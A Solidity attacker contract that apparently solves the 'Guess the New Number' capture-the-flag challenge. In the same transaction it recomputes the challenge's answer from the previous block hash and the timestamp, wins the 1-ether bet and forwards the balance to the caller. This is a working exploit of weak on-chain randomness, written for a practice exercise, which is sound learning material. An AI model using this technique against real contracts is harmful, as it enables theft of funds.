pragma solidity ^0.8.8;

interface IGuessTheNewNumberChallenge {
    function isComplete() external view returns (bool);
    function guess(uint8 n) external payable;
}

contract GuessTheNewNumberAttacker {
    IGuessTheNewNumberChallenge public challenge;

    constructor (address challengeAddress) {
        challenge = IGuessTheNewNumberChallenge(challengeAddress);            
    }

    function attack() external payable {
        require(address(this).balance >= 1 ether, "not enough funds");
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))));
        challenge.guess{value: 1 ether}(answer);

        require(challenge.isComplete(), "challenge not completed");
        payable(tx.origin).transfer(address(this).balance);
    }

    receive() external payable {}
}

